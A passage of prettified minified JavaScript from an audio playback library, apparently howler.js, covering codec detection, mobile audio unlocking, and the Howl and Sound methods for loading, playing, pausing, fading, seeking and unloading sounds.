            o.canPlayType('audio/wav; codecs="1"') || o.canPlayType("audio/wav")
          ).replace(/^no$/, ""),
          aac: !!o.canPlayType("audio/aac;").replace(/^no$/, ""),
          caf: !!o.canPlayType("audio/x-caf;").replace(/^no$/, ""),
          m4a: !!(
            o.canPlayType("audio/x-m4a;") ||
            o.canPlayType("audio/m4a;") ||
            o.canPlayType("audio/aac;")
          ).replace(/^no$/, ""),
          m4b: !!(
            o.canPlayType("audio/x-m4b;") ||
            o.canPlayType("audio/m4b;") ||
            o.canPlayType("audio/aac;")
          ).replace(/^no$/, ""),
          mp4: !!(
            o.canPlayType("audio/x-mp4;") ||
            o.canPlayType("audio/mp4;") ||
            o.canPlayType("audio/aac;")
          ).replace(/^no$/, ""),
          weba: !(
            _ ||
            !o.canPlayType('audio/webm; codecs="vorbis"').replace(/^no$/, "")
          ),
          webm: !(
            _ ||
            !o.canPlayType('audio/webm; codecs="vorbis"').replace(/^no$/, "")
          ),
          dolby: !!o
            .canPlayType('audio/mp4; codecs="ec-3"')
            .replace(/^no$/, ""),
          flac: !!(
            o.canPlayType("audio/x-flac;") || o.canPlayType("audio/flac;")
          ).replace(/^no$/, ""),
        }),
        e
      );
    },
    _unlockAudio: function () {
      var e = this || n;
      if (!e._audioUnlocked && e.ctx) {
        (e._audioUnlocked = !1),
          (e.autoUnlock = !1),
          e._mobileUnloaded ||
            44100 === e.ctx.sampleRate ||
            ((e._mobileUnloaded = !0), e.unload()),
          (e._scratchBuffer = e.ctx.createBuffer(1, 1, 22050));
        var o = function (n) {
          for (; e._html5AudioPool.length < e.html5PoolSize; )
            try {
              var t = new Audio();
              (t._unlocked = !0), e._releaseHtml5Audio(t);
            } catch (n) {
              e.noAudio = !0;
              break;
            }
          for (var r = 0; r < e._howls.length; r++)
            if (!e._howls[r]._webAudio)
              for (
                var a = e._howls[r]._getSoundIds(), u = 0;
                u < a.length;
                u++
              ) {
                var d = e._howls[r]._soundById(a[u]);
                d &&
                  d._node &&
                  !d._node._unlocked &&
                  ((d._node._unlocked = !0), d._node.load());
              }
          e._autoResume();
          var i = e.ctx.createBufferSource();
          (i.buffer = e._scratchBuffer),
            i.connect(e.ctx.destination),
            void 0 === i.start ? i.noteOn(0) : i.start(0),
            "function" == typeof e.ctx.resume && e.ctx.resume(),
            (i.onended = function () {
              i.disconnect(0),
                (e._audioUnlocked = !0),
                document.removeEventListener("touchstart", o, !0),
                document.removeEventListener("touchend", o, !0),
                document.removeEventListener("click", o, !0),
                document.removeEventListener("keydown", o, !0);
              for (var n = 0; n < e._howls.length; n++)
                e._howls[n]._emit("unlock");
            });
        };
        return (
          document.addEventListener("touchstart", o, !0),
          document.addEventListener("touchend", o, !0),
          document.addEventListener("click", o, !0),
          document.addEventListener("keydown", o, !0),
          e
        );
      }
    },
    _obtainHtml5Audio: function () {
      var e = this || n;
      if (e._html5AudioPool.length) return e._html5AudioPool.pop();
      var o = new Audio().play();
      return (
        o &&
          "undefined" != typeof Promise &&
          (o instanceof Promise || "function" == typeof o.then) &&
          o.catch(function () {
            console.warn(
              "HTML5 Audio pool exhausted, returning potentially locked audio object."
            );
          }),
        new Audio()
      );
    },
    _releaseHtml5Audio: function (e) {
      var o = this || n;
      return e._unlocked && o._html5AudioPool.push(e), o;
    },
    _autoSuspend: function () {
      var e = this;
      if (
        e.autoSuspend &&
        e.ctx &&
        void 0 !== e.ctx.suspend &&
        n.usingWebAudio
      ) {
        for (var o = 0; o < e._howls.length; o++)
          if (e._howls[o]._webAudio)
            for (var t = 0; t < e._howls[o]._sounds.length; t++)
              if (!e._howls[o]._sounds[t]._paused) return e;
        return (
          e._suspendTimer && clearTimeout(e._suspendTimer),
          (e._suspendTimer = setTimeout(function () {
            if (e.autoSuspend) {
              (e._suspendTimer = null), (e.state = "suspending");
              var n = function () {
                (e.state = "suspended"),
                  e._resumeAfterSuspend &&
                    (delete e._resumeAfterSuspend, e._autoResume());
              };
              e.ctx.suspend().then(n, n);
            }
          }, 3e4)),
          e
        );
      }
    },
    _autoResume: function () {
      var e = this;
      if (e.ctx && void 0 !== e.ctx.resume && n.usingWebAudio)
        return (
          "running" === e.state &&
          "interrupted" !== e.ctx.state &&
          e._suspendTimer
            ? (clearTimeout(e._suspendTimer), (e._suspendTimer = null))
            : "suspended" === e.state ||
              ("running" === e.state && "interrupted" === e.ctx.state)
            ? (e.ctx.resume().then(function () {
                e.state = "running";
                for (var n = 0; n < e._howls.length; n++)
                  e._howls[n]._emit("resume");
              }),
              e._suspendTimer &&
                (clearTimeout(e._suspendTimer), (e._suspendTimer = null)))
            : "suspending" === e.state && (e._resumeAfterSuspend = !0),
          e
        );
    },
  };
  var n = new e(),
    o = function (e) {
      var n = this;
      if (!e.src || 0 === e.src.length)
        return void console.error(
          "An array of source files must be passed with any new Howl."
        );
      n.init(e);
    };
  o.prototype = {
    init: function (e) {
      var o = this;
      return (
        n.ctx || _(),
        (o._autoplay = e.autoplay || !1),
        (o._format = "string" != typeof e.format ? e.format : [e.format]),
        (o._html5 = e.html5 || !1),
        (o._muted = e.mute || !1),
        (o._loop = e.loop || !1),
        (o._pool = e.pool || 5),
        (o._preload =
          ("boolean" != typeof e.preload && "metadata" !== e.preload) ||
          e.preload),
        (o._rate = e.rate || 1),
        (o._sprite = e.sprite || {}),
        (o._src = "string" != typeof e.src ? e.src : [e.src]),
        (o._volume = void 0 !== e.volume ? e.volume : 1),
        (o._xhr = {
          method: e.xhr && e.xhr.method ? e.xhr.method : "GET",
          headers: e.xhr && e.xhr.headers ? e.xhr.headers : null,
          withCredentials:
            !(!e.xhr || !e.xhr.withCredentials) && e.xhr.withCredentials,
        }),
        (o._duration = 0),
        (o._state = "unloaded"),
        (o._sounds = []),
        (o._endTimers = {}),
        (o._queue = []),
        (o._playLock = !1),
        (o._onend = e.onend ? [{ fn: e.onend }] : []),
        (o._onfade = e.onfade ? [{ fn: e.onfade }] : []),
        (o._onload = e.onload ? [{ fn: e.onload }] : []),
        (o._onloaderror = e.onloaderror ? [{ fn: e.onloaderror }] : []),
        (o._onplayerror = e.onplayerror ? [{ fn: e.onplayerror }] : []),
        (o._onpause = e.onpause ? [{ fn: e.onpause }] : []),
        (o._onplay = e.onplay ? [{ fn: e.onplay }] : []),
        (o._onstop = e.onstop ? [{ fn: e.onstop }] : []),
        (o._onmute = e.onmute ? [{ fn: e.onmute }] : []),
        (o._onvolume = e.onvolume ? [{ fn: e.onvolume }] : []),
        (o._onrate = e.onrate ? [{ fn: e.onrate }] : []),
        (o._onseek = e.onseek ? [{ fn: e.onseek }] : []),
        (o._onunlock = e.onunlock ? [{ fn: e.onunlock }] : []),
        (o._onresume = []),
        (o._webAudio = n.usingWebAudio && !o._html5),
        void 0 !== n.ctx && n.ctx && n.autoUnlock && n._unlockAudio(),
        n._howls.push(o),
        o._autoplay &&
          o._queue.push({
            event: "play",
            action: function () {
              o.play();
            },
          }),
        o._preload && "none" !== o._preload && o.load(),
        o
      );
    },
    load: function () {
      var e = this,
        o = null;
      if (n.noAudio)
        return void e._emit("loaderror", null, "No audio support.");
      "string" == typeof e._src && (e._src = [e._src]);
      for (var r = 0; r < e._src.length; r++) {
        var u, d;
        if (e._format && e._format[r]) u = e._format[r];
        else {
          if ("string" != typeof (d = e._src[r])) {
            e._emit(
              "loaderror",
              null,
              "Non-string found in selected audio sources - ignoring."
            );
            continue;
          }
          (u = /^data:audio\/([^;,]+);/i.exec(d)),
            u || (u = /\.([^.]+)$/.exec(d.split("?", 1)[0])),
            u && (u = u[1].toLowerCase());
        }
        if (
          (u ||
            console.warn(
              'No file extension was found. Consider using the "format" property or specify an extension.'
            ),
          u && n.codecs(u))
        ) {
          o = e._src[r];
          break;
        }
      }
      return o
        ? ((e._src = o),
          (e._state = "loading"),
          "https:" === window.location.protocol &&
            "http:" === o.slice(0, 5) &&
            ((e._html5 = !0), (e._webAudio = !1)),
          new t(e),
          e._webAudio && a(e),
          e)
        : void e._emit(
            "loaderror",
            null,
            "No codec support for selected audio sources."
          );
    },
    play: function (e, o) {
      var t = this,
        r = null;
      if ("number" == typeof e) (r = e), (e = null);
      else {
        if ("string" == typeof e && "loaded" === t._state && !t._sprite[e])
          return null;
        if (void 0 === e && ((e = "__default"), !t._playLock)) {
          for (var a = 0, u = 0; u < t._sounds.length; u++)
            t._sounds[u]._paused &&
              !t._sounds[u]._ended &&
              (a++, (r = t._sounds[u]._id));
          1 === a ? (e = null) : (r = null);
        }
      }
      var d = r ? t._soundById(r) : t._inactiveSound();
      if (!d) return null;
      if ((r && !e && (e = d._sprite || "__default"), "loaded" !== t._state)) {
        (d._sprite = e), (d._ended = !1);
        var i = d._id;
        return (
          t._queue.push({
            event: "play",
            action: function () {
              t.play(i);
            },
          }),
          i
        );
      }
      if (r && !d._paused) return o || t._loadQueue("play"), d._id;
      t._webAudio && n._autoResume();
      var _ = Math.max(0, d._seek > 0 ? d._seek : t._sprite[e][0] / 1e3),
        s = Math.max(0, (t._sprite[e][0] + t._sprite[e][1]) / 1e3 - _),
        l = (1e3 * s) / Math.abs(d._rate),
        c = t._sprite[e][0] / 1e3,
        f = (t._sprite[e][0] + t._sprite[e][1]) / 1e3;
      (d._sprite = e), (d._ended = !1);
      var p = function () {
        (d._paused = !1),
          (d._seek = _),
          (d._start = c),
          (d._stop = f),
          (d._loop = !(!d._loop && !t._sprite[e][2]));
      };
      if (_ >= f) return void t._ended(d);
      var m = d._node;
      if (t._webAudio) {
        var v = function () {
          (t._playLock = !1), p(), t._refreshBuffer(d);
          var e = d._muted || t._muted ? 0 : d._volume;
          m.gain.setValueAtTime(e, n.ctx.currentTime),
            (d._playStart = n.ctx.currentTime),
            void 0 === m.bufferSource.start
              ? d._loop
                ? m.bufferSource.noteGrainOn(0, _, 86400)
                : m.bufferSource.noteGrainOn(0, _, s)
              : d._loop
              ? m.bufferSource.start(0, _, 86400)
              : m.bufferSource.start(0, _, s),
            l !== 1 / 0 &&
              (t._endTimers[d._id] = setTimeout(t._ended.bind(t, d), l)),
            o ||
              setTimeout(function () {
                t._emit("play", d._id), t._loadQueue();
              }, 0);
        };
        "running" === n.state && "interrupted" !== n.ctx.state
          ? v()
          : ((t._playLock = !0), t.once("resume", v), t._clearTimer(d._id));
      } else {
        var h = function () {
          (m.currentTime = _),
            (m.muted = d._muted || t._muted || n._muted || m.muted),
            (m.volume = d._volume * n.volume()),
            (m.playbackRate = d._rate);
          try {
            var r = m.play();
            if (
              (r &&
              "undefined" != typeof Promise &&
              (r instanceof Promise || "function" == typeof r.then)
                ? ((t._playLock = !0),
                  p(),
                  r
                    .then(function () {
                      (t._playLock = !1),
                        (m._unlocked = !0),
                        o ? t._loadQueue() : t._emit("play", d._id);
                    })
                    .catch(function () {
                      (t._playLock = !1),
                        t._emit(
                          "playerror",
                          d._id,
                          "Playback was unable to start. This is most commonly an issue on mobile devices and Chrome where playback was not within a user interaction."
                        ),
                        (d._ended = !0),
                        (d._paused = !0);
                    }))
                : o || ((t._playLock = !1), p(), t._emit("play", d._id)),
              (m.playbackRate = d._rate),
              m.paused)
            )
              return void t._emit(
                "playerror",
                d._id,
                "Playback was unable to start. This is most commonly an issue on mobile devices and Chrome where playback was not within a user interaction."
              );
            "__default" !== e || d._loop
              ? (t._endTimers[d._id] = setTimeout(t._ended.bind(t, d), l))
              : ((t._endTimers[d._id] = function () {
                  t._ended(d),
                    m.removeEventListener("ended", t._endTimers[d._id], !1);
                }),
                m.addEventListener("ended", t._endTimers[d._id], !1));
          } catch (e) {
            t._emit("playerror", d._id, e);
          }
        };
        "data:audio/wav;base64,UklGRigAAABXQVZFZm10IBIAAAABAAEARKwAAIhYAQACABAAAABkYXRhAgAAAAEA" ===
          m.src && ((m.src = t._src), m.load());
        var y =
          (window && window.ejecta) ||
          (!m.readyState && n._navigator.isCocoonJS);
        if (m.readyState >= 3 || y) h();
        else {
          (t._playLock = !0), (t._state = "loading");
          var g = function () {
            (t._state = "loaded"),
              h(),
              m.removeEventListener(n._canPlayEvent, g, !1);
          };
          m.addEventListener(n._canPlayEvent, g, !1), t._clearTimer(d._id);
        }
      }
      return d._id;
    },
    pause: function (e) {
      var n = this;
      if ("loaded" !== n._state || n._playLock)
        return (
          n._queue.push({
            event: "pause",
            action: function () {
              n.pause(e);
            },
          }),
          n
        );
      for (var o = n._getSoundIds(e), t = 0; t < o.length; t++) {
        n._clearTimer(o[t]);
        var r = n._soundById(o[t]);
        if (
          r &&
          !r._paused &&
          ((r._seek = n.seek(o[t])),
          (r._rateSeek = 0),
          (r._paused = !0),
          n._stopFade(o[t]),
          r._node)
        )
          if (n._webAudio) {
            if (!r._node.bufferSource) continue;
            void 0 === r._node.bufferSource.stop
              ? r._node.bufferSource.noteOff(0)
              : r._node.bufferSource.stop(0),
              n._cleanBuffer(r._node);
          } else
            (isNaN(r._node.duration) && r._node.duration !== 1 / 0) ||
              r._node.pause();
        arguments[1] || n._emit("pause", r ? r._id : null);
      }
      return n;
    },
    stop: function (e, n) {
      var o = this;
      if ("loaded" !== o._state || o._playLock)
        return (
          o._queue.push({
            event: "stop",
            action: function () {
              o.stop(e);
            },
          }),
          o
        );
      for (var t = o._getSoundIds(e), r = 0; r < t.length; r++) {
        o._clearTimer(t[r]);
        var a = o._soundById(t[r]);
        a &&
          ((a._seek = a._start || 0),
          (a._rateSeek = 0),
          (a._paused = !0),
          (a._ended = !0),
          o._stopFade(t[r]),
          a._node &&
            (o._webAudio
              ? a._node.bufferSource &&
                (void 0 === a._node.bufferSource.stop
                  ? a._node.bufferSource.noteOff(0)
                  : a._node.bufferSource.stop(0),
                o._cleanBuffer(a._node))
              : (isNaN(a._node.duration) && a._node.duration !== 1 / 0) ||
                ((a._node.currentTime = a._start || 0),
                a._node.pause(),
                a._node.duration === 1 / 0 && o._clearSound(a._node))),
          n || o._emit("stop", a._id));
      }
      return o;
    },
    mute: function (e, o) {
      var t = this;
      if ("loaded" !== t._state || t._playLock)
        return (
          t._queue.push({
            event: "mute",
            action: function () {
              t.mute(e, o);
            },
          }),
          t
        );
      if (void 0 === o) {
        if ("boolean" != typeof e) return t._muted;
        t._muted = e;
      }
      for (var r = t._getSoundIds(o), a = 0; a < r.length; a++) {
        var u = t._soundById(r[a]);
        u &&
          ((u._muted = e),
          u._interval && t._stopFade(u._id),
          t._webAudio && u._node
            ? u._node.gain.setValueAtTime(e ? 0 : u._volume, n.ctx.currentTime)
            : u._node && (u._node.muted = !!n._muted || e),
          t._emit("mute", u._id));
      }
      return t;
    },
    volume: function () {
      var e,
        o,
        t = this,
        r = arguments;
      if (0 === r.length) return t._volume;
      if (1 === r.length || (2 === r.length && void 0 === r[1])) {
        t._getSoundIds().indexOf(r[0]) >= 0
          ? (o = parseInt(r[0], 10))
          : (e = parseFloat(r[0]));
      } else
        r.length >= 2 && ((e = parseFloat(r[0])), (o = parseInt(r[1], 10)));
      var a;
      if (!(void 0 !== e && e >= 0 && e <= 1))
        return (a = o ? t._soundById(o) : t._sounds[0]), a ? a._volume : 0;
      if ("loaded" !== t._state || t._playLock)
        return (
          t._queue.push({
            event: "volume",
            action: function () {
              t.volume.apply(t, r);
            },
          }),
          t
        );
      void 0 === o && (t._volume = e), (o = t._getSoundIds(o));
      for (var u = 0; u < o.length; u++)
        (a = t._soundById(o[u])) &&
          ((a._volume = e),
          r[2] || t._stopFade(o[u]),
          t._webAudio && a._node && !a._muted
            ? a._node.gain.setValueAtTime(e, n.ctx.currentTime)
            : a._node && !a._muted && (a._node.volume = e * n.volume()),
          t._emit("volume", a._id));
      return t;
    },
    fade: function (e, o, t, r) {
      var a = this;
      if ("loaded" !== a._state || a._playLock)
        return (
          a._queue.push({
            event: "fade",
            action: function () {
              a.fade(e, o, t, r);
            },
          }),
          a
        );
      (e = Math.min(Math.max(0, parseFloat(e)), 1)),
        (o = Math.min(Math.max(0, parseFloat(o)), 1)),
        (t = parseFloat(t)),
        a.volume(e, r);
      for (var u = a._getSoundIds(r), d = 0; d < u.length; d++) {
        var i = a._soundById(u[d]);
        if (i) {
          if ((r || a._stopFade(u[d]), a._webAudio && !i._muted)) {
            var _ = n.ctx.currentTime,
              s = _ + t / 1e3;
            (i._volume = e),
              i._node.gain.setValueAtTime(e, _),
              i._node.gain.linearRampToValueAtTime(o, s);
          }
          a._startFadeInterval(i, e, o, t, u[d], void 0 === r);
        }
      }
      return a;
    },
    _startFadeInterval: function (e, n, o, t, r, a) {
      var u = this,
        d = n,
        i = o - n,
        _ = Math.abs(i / 0.01),
        s = Math.max(4, _ > 0 ? t / _ : t),
        l = Date.now();
      (e._fadeTo = o),
        (e._interval = setInterval(function () {
          var r = (Date.now() - l) / t;
          (l = Date.now()),
            (d += i * r),
            (d = Math.round(100 * d) / 100),
            (d = i < 0 ? Math.max(o, d) : Math.min(o, d)),
            u._webAudio ? (e._volume = d) : u.volume(d, e._id, !0),
            a && (u._volume = d),
            ((o < n && d <= o) || (o > n && d >= o)) &&
              (clearInterval(e._interval),
              (e._interval = null),
              (e._fadeTo = null),
              u.volume(o, e._id),
              u._emit("fade", e._id));
        }, s));
    },
    _stopFade: function (e) {
      var o = this,
        t = o._soundById(e);
      return (
        t &&
          t._interval &&
          (o._webAudio && t._node.gain.cancelScheduledValues(n.ctx.currentTime),
          clearInterval(t._interval),
          (t._interval = null),
          o.volume(t._fadeTo, e),
          (t._fadeTo = null),
          o._emit("fade", e)),
        o
      );
    },
    loop: function () {
      var e,
        n,
        o,
        t = this,
        r = arguments;
      if (0 === r.length) return t._loop;
      if (1 === r.length) {
        if ("boolean" != typeof r[0])
          return !!(o = t._soundById(parseInt(r[0], 10))) && o._loop;
        (e = r[0]), (t._loop = e);
      } else 2 === r.length && ((e = r[0]), (n = parseInt(r[1], 10)));
      for (var a = t._getSoundIds(n), u = 0; u < a.length; u++)
        (o = t._soundById(a[u])) &&
          ((o._loop = e),
          t._webAudio &&
            o._node &&
            o._node.bufferSource &&
            ((o._node.bufferSource.loop = e),
            e &&
              ((o._node.bufferSource.loopStart = o._start || 0),
              (o._node.bufferSource.loopEnd = o._stop),
              t.playing(a[u]) && (t.pause(a[u], !0), t.play(a[u], !0)))));
      return t;
    },
    rate: function () {
      var e,
        o,
        t = this,
        r = arguments;
      if (0 === r.length) o = t._sounds[0]._id;
      else if (1 === r.length) {
        var a = t._getSoundIds(),
          u = a.indexOf(r[0]);
        u >= 0 ? (o = parseInt(r[0], 10)) : (e = parseFloat(r[0]));
      } else
        2 === r.length && ((e = parseFloat(r[0])), (o = parseInt(r[1], 10)));
      var d;
      if ("number" != typeof e)
        return (d = t._soundById(o)), d ? d._rate : t._rate;
      if ("loaded" !== t._state || t._playLock)
        return (
          t._queue.push({
            event: "rate",
            action: function () {
              t.rate.apply(t, r);
            },
          }),
          t
        );
      void 0 === o && (t._rate = e), (o = t._getSoundIds(o));
      for (var i = 0; i < o.length; i++)
        if ((d = t._soundById(o[i]))) {
          t.playing(o[i]) &&
            ((d._rateSeek = t.seek(o[i])),
            (d._playStart = t._webAudio ? n.ctx.currentTime : d._playStart)),
            (d._rate = e),
            t._webAudio && d._node && d._node.bufferSource
              ? d._node.bufferSource.playbackRate.setValueAtTime(
                  e,
                  n.ctx.currentTime
                )
              : d._node && (d._node.playbackRate = e);
          var _ = t.seek(o[i]),
            s = (t._sprite[d._sprite][0] + t._sprite[d._sprite][1]) / 1e3 - _,
            l = (1e3 * s) / Math.abs(d._rate);
          (!t._endTimers[o[i]] && d._paused) ||
            (t._clearTimer(o[i]),
            (t._endTimers[o[i]] = setTimeout(t._ended.bind(t, d), l))),
            t._emit("rate", d._id);
        }
      return t;
    },
    seek: function () {
      var e,
        o,
        t = this,
        r = arguments;
      if (0 === r.length) t._sounds.length && (o = t._sounds[0]._id);
      else if (1 === r.length) {
        var a = t._getSoundIds(),
          u = a.indexOf(r[0]);
        u >= 0
          ? (o = parseInt(r[0], 10))
          : t._sounds.length &&
            ((o = t._sounds[0]._id), (e = parseFloat(r[0])));
      } else
        2 === r.length && ((e = parseFloat(r[0])), (o = parseInt(r[1], 10)));
      if (void 0 === o) return 0;
      if ("number" == typeof e && ("loaded" !== t._state || t._playLock))
        return (
          t._queue.push({
            event: "seek",
            action: function () {
              t.seek.apply(t, r);
            },
          }),
          t
        );
      var d = t._soundById(o);
      if (d) {
        if (!("number" == typeof e && e >= 0)) {
          if (t._webAudio) {
            var i = t.playing(o) ? n.ctx.currentTime - d._playStart : 0,
              _ = d._rateSeek ? d._rateSeek - d._seek : 0;
            return d._seek + (_ + i * Math.abs(d._rate));
          }
          return d._node.currentTime;
        }
        var s = t.playing(o);
        s && t.pause(o, !0),
          (d._seek = e),
          (d._ended = !1),
          t._clearTimer(o),
          t._webAudio ||
            !d._node ||
            isNaN(d._node.duration) ||
            (d._node.currentTime = e);
        var l = function () {
          s && t.play(o, !0), t._emit("seek", o);
        };
        if (s && !t._webAudio) {
          var c = function () {
            t._playLock ? setTimeout(c, 0) : l();
          };
          setTimeout(c, 0);
        } else l();
      }
      return t;
    },
    playing: function (e) {
      var n = this;
      if ("number" == typeof e) {
        var o = n._soundById(e);
        return !!o && !o._paused;
      }
      for (var t = 0; t < n._sounds.length; t++)
        if (!n._sounds[t]._paused) return !0;
      return !1;
    },
    duration: function (e) {
      var n = this,
        o = n._duration,
        t = n._soundById(e);
      return t && (o = n._sprite[t._sprite][1] / 1e3), o;
    },
    state: function () {
      return this._state;
    },
    unload: function () {
      for (var e = this, o = e._sounds, t = 0; t < o.length; t++)
        o[t]._paused || e.stop(o[t]._id),
          e._webAudio ||
            (e._clearSound(o[t]._node),
            o[t]._node.removeEventListener("error", o[t]._errorFn, !1),
            o[t]._node.removeEventListener(n._canPlayEvent, o[t]._loadFn, !1),
            o[t]._node.removeEventListener("ended", o[t]._endFn, !1),
            n._releaseHtml5Audio(o[t]._node)),
          delete o[t]._node,
          e._clearTimer(o[t]._id);
      var a = n._howls.indexOf(e);
      a >= 0 && n._howls.splice(a, 1);
      var u = !0;
      for (t = 0; t < n._howls.length; t++)
        if (
          n._howls[t]._src === e._src ||
          e._src.indexOf(n._howls[t]._src) >= 0
        ) {
          u = !1;
          break;
        }
      return (
        r && u && delete r[e._src],
        (n.noAudio = !1),
        (e._state = "unloaded"),
        (e._sounds = []),
        (e = null),
        null
      );
    },
    on: function (e, n, o, t) {
      var r = this,
        a = r["_on" + e];
      return (
        "function" == typeof n &&
          a.push(t ? { id: o, fn: n, once: t } : { id: o, fn: n }),
        r
      );
    },
    off: function (e, n, o) {
      var t = this,
        r = t["_on" + e],
        a = 0;
      if (("number" == typeof n && ((o = n), (n = null)), n || o))
        for (a = 0; a < r.length; a++) {
          var u = o === r[a].id;
          if ((n === r[a].fn && u) || (!n && u)) {
            r.splice(a, 1);
            break;
          }
        }
      else if (e) t["_on" + e] = [];
      else {
        var d = Object.keys(t);
        for (a = 0; a < d.length; a++)
          0 === d[a].indexOf("_on") && Array.isArray(t[d[a]]) && (t[d[a]] = []);
      }
      return t;
    },
    once: function (e, n, o) {
      var t = this;
      return t.on(e, n, o, 1), t;
    },
    _emit: function (e, n, o) {
      for (var t = this, r = t["_on" + e], a = r.length - 1; a >= 0; a--)
        (r[a].id && r[a].id !== n && "load" !== e) ||
          (setTimeout(
            function (e) {
              e.call(this, n, o);
            }.bind(t, r[a].fn),
            0
          ),
          r[a].once && t.off(e, r[a].fn, r[a].id));
      return t._loadQueue(e), t;
    },
    _loadQueue: function (e) {
      var n = this;
      if (n._queue.length > 0) {
        var o = n._queue[0];
        o.event === e && (n._queue.shift(), n._loadQueue()), e || o.action();
      }
      return n;
    },
    _ended: function (e) {
      var o = this,
        t = e._sprite;
      if (
        !o._webAudio &&
        e._node &&
        !e._node.paused &&
        !e._node.ended &&
        e._node.currentTime < e._stop
      )
        return setTimeout(o._ended.bind(o, e), 100), o;
      var r = !(!e._loop && !o._sprite[t][2]);
      if (
        (o._emit("end", e._id),
        !o._webAudio && r && o.stop(e._id, !0).play(e._id),
        o._webAudio && r)
      ) {
        o._emit("play", e._id),
          (e._seek = e._start || 0),
          (e._rateSeek = 0),
          (e._playStart = n.ctx.currentTime);
        var a = (1e3 * (e._stop - e._start)) / Math.abs(e._rate);
        o._endTimers[e._id] = setTimeout(o._ended.bind(o, e), a);
      }
      return (
        o._webAudio &&
          !r &&
          ((e._paused = !0),
          (e._ended = !0),
          (e._seek = e._start || 0),
          (e._rateSeek = 0),
          o._clearTimer(e._id),
          o._cleanBuffer(e._node),
          n._autoSuspend()),
        o._webAudio || r || o.stop(e._id, !0),
        o
      );
    },
    _clearTimer: function (e) {
      var n = this;
      if (n._endTimers[e]) {
        if ("function" != typeof n._endTimers[e]) clearTimeout(n._endTimers[e]);
        else {
          var o = n._soundById(e);
          o &&
            o._node &&
            o._node.removeEventListener("ended", n._endTimers[e], !1);
        }
        delete n._endTimers[e];
      }
      return n;
    },
    _soundById: function (e) {
      for (var n = this, o = 0; o < n._sounds.length; o++)
        if (e === n._sounds[o]._id) return n._sounds[o];
      return null;
    },
    _inactiveSound: function () {
      var e = this;
      e._drain();
      for (var n = 0; n < e._sounds.length; n++)
        if (e._sounds[n]._ended) return e._sounds[n].reset();
      return new t(e);
    },
    _drain: function () {
      var e = this,
        n = e._pool,
        o = 0,
        t = 0;
      if (!(e._sounds.length < n)) {
        for (t = 0; t < e._sounds.length; t++) e._sounds[t]._ended && o++;
        for (t = e._sounds.length - 1; t >= 0; t--) {
          if (o <= n) return;
          e._sounds[t]._ended &&
            (e._webAudio &&
              e._sounds[t]._node &&
              e._sounds[t]._node.disconnect(0),
            e._sounds.splice(t, 1),
            o--);
        }
      }
    },
    _getSoundIds: function (e) {
      var n = this;
      if (void 0 === e) {
        for (var o = [], t = 0; t < n._sounds.length; t++)
          o.push(n._sounds[t]._id);
        return o;
      }
      return [e];
    },
    _refreshBuffer: function (e) {
      var o = this;
      return (
        (e._node.bufferSource = n.ctx.createBufferSource()),
        (e._node.bufferSource.buffer = r[o._src]),
        e._panner
          ? e._node.bufferSource.connect(e._panner)
          : e._node.bufferSource.connect(e._node),
        (e._node.bufferSource.loop = e._loop),
        e._loop &&
          ((e._node.bufferSource.loopStart = e._start || 0),
          (e._node.bufferSource.loopEnd = e._stop || 0)),
        e._node.bufferSource.playbackRate.setValueAtTime(
          e._rate,
          n.ctx.currentTime
        ),
        o
      );
    },
    _cleanBuffer: function (e) {
      var o = this,
        t = n._navigator && n._navigator.vendor.indexOf("Apple") >= 0;
      if (
        n._scratchBuffer &&
        e.bufferSource &&
        ((e.bufferSource.onended = null), e.bufferSource.disconnect(0), t)
      )
        try {
          e.bufferSource.buffer = n._scratchBuffer;
        } catch (e) {}
      return (e.bufferSource = null), o;
    },
    _clearSound: function (e) {
      /MSIE |Trident\//.test(n._navigator && n._navigator.userAgent) ||
        (e.src =
          "data:audio/wav;base64,UklGRigAAABXQVZFZm10IBIAAAABAAEARKwAAIhYAQACABAAAABkYXRhAgAAAAEA");
    },
  };
  var t = function (e) {
    (this._parent = e), this.init();
  };
  t.prototype = {
    init: function () {
      var e = this,
        o = e._parent;
      return (
        (e._muted = o._muted),
        (e._loop = o._loop),
        (e._volume = o._volume),
        (e._rate = o._rate),
        (e._seek = 0),
        (e._paused = !0),
        (e._ended = !0),
        (e._sprite = "__default"),
        (e._id = ++n._counter),
        o._sounds.push(e),
        e.create(),
        e
      );
    },
    create: function () {
      var e = this,
        o = e._parent,
        t = n._muted || e._muted || e._parent._muted ? 0 : e._volume;
      return (
        o._webAudio
          ? ((e._node =
              void 0 === n.ctx.createGain
                ? n.ctx.createGainNode()
                : n.ctx.createGain()),
            e._node.gain.setValueAtTime(t, n.ctx.currentTime),
            (e._node.paused = !0),
            e._node.connect(n.masterGain))
          : n.noAudio ||
            ((e._node = n._obtainHtml5Audio()),
            (e._errorFn = e._errorListener.bind(e)),
            e._node.addEventListener("error", e._errorFn, !1),
            (e._loadFn = e._loadListener.bind(e)),
            e._node.addEventListener(n._canPlayEvent, e._loadFn, !1),
            (e._endFn = e._endListener.bind(e)),
            e._node.addEventListener("ended", e._endFn, !1),
            (e._node.src = o._src),
            (e._node.preload = !0 === o._preload ? "auto" : o._preload),
            (e._node.volume = t * n.volume()),
            e._node.load()),
        e
      );
    },
    reset: function () {
      var e = this,
        o = e._parent;
      return (
        (e._muted = o._muted),
        (e._loop = o._loop),
        (e._volume = o._volume),
        (e._rate = o._rate),
        (e._seek = 0),
        (e._rateSeek = 0),
        (e._paused = !0),
        (e._ended = !0),
        (e._sprite = "__default"),
        (e._id = ++n._counter),
        e
      );
    },
    _errorListener: function () {
      var e = this;
      e._parent._emit(
        "loaderror",
        e._id,
        e._node.error ? e._node.error.code : 0
      ),
        e._node.removeEventListener("error", e._errorFn, !1);
    },
    _loadListener: function () {
      var e = this,
        o = e._parent;
      (o._duration = Math.ceil(10 * e._node.duration) / 10),
        0 === Object.keys(o._sprite).length &&
          (o._sprite = { __default: [0, 1e3 * o._duration] }),
        "loaded" !== o._state &&
          ((o._state = "loaded"), o._emit("load"), o._loadQueue()),
        e._node.removeEventListener(n._canPlayEvent, e._loadFn, !1);
    },
    _endListener: function () {
      var e = this,
        n = e._parent;
      n._duration === 1 / 0 &&
        ((n._duration = Math.ceil(10 * e._node.duration) / 10),
        n._sprite.__default[1] === 1 / 0 &&
          (n._sprite.__default[1] = 1e3 * n._duration),
        n._ended(e)),
        e._node.removeEventListener("ended", e._endFn, !1);
    },
  };
  var r = {},
    a = function (e) {
      var n = e._src;
      if (r[n]) return (e._duration = r[n].duration), void i(e);
      if (/^data:[^;]+;base64,/.test(n)) {
        for (
          var o = atob(n.split(",")[1]), t = new Uint8Array(o.length), a = 0;
          a < o.length;
          ++a
        )
